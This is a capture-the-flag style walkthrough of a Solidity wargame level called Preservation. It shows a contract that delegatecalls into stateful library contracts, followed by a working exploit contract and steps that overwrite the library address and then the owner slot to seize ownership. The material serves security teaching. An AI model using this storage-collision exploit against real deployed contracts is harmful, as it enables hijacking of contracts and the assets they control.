# Preservation
_difficulty 8/10_

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.  

The goal of this level is for you to claim ownership of the instance  you are given.  

Things that might help  
- Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
- Understanding what it means for delegatecall to be context-preserving.
- Understanding how storage variables are stored and accessed.
- Understanding how casting works between different data types.

## Sources
```javascript
pragma solidity ^0.4.23;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

## Solution

Solidity libraries can modify invoking contracts code if called with `delegatecall` if they are defined as contracts and not as libraries.

1. Using Remix, deploy the `PreservationHack.sol` that will be injected into timeZone1Library storage space.

PreservationHack.sol
```javascript
pragma solidity ^0.4.23;

contract PreservationHack {
  // copy original contract data layout
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  
  function hack(address _preservation) public {
      Preservation preservation = Preservation(_preservation);
      // copy address of this library to the storage space 0
      preservation.setFirstTime(uint256(address(this)));
      // set "owner" variable at storage space 2
      preservation.setFirstTime(1);
  }

  function setTime(uint _hackData) public {
    _hackData;
    // this line will set us as the owner of the invoking contract
    // solium-disable-next-line security/no-tx-origin
    owner = tx.origin;
  }
}
```

2. Invoke `hack` method of the `PreservationHack` contract. This contract will inject it's address in the storage space 0, and then invoke `setTime` method on itself. This will set `owner` variable to `player` address.

3. Check if player is the owner of the contract.  
`player === (await contract.owner())`  
true  

4. Submit instance ðŸŽ‰ 

## Lesson

As the previous level, `delegate` mentions, the use of `delegatecall` to call libraries can be risky. This is particularly true for contract "libraries" that have their own state. This example demonstrates why the `library` keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.
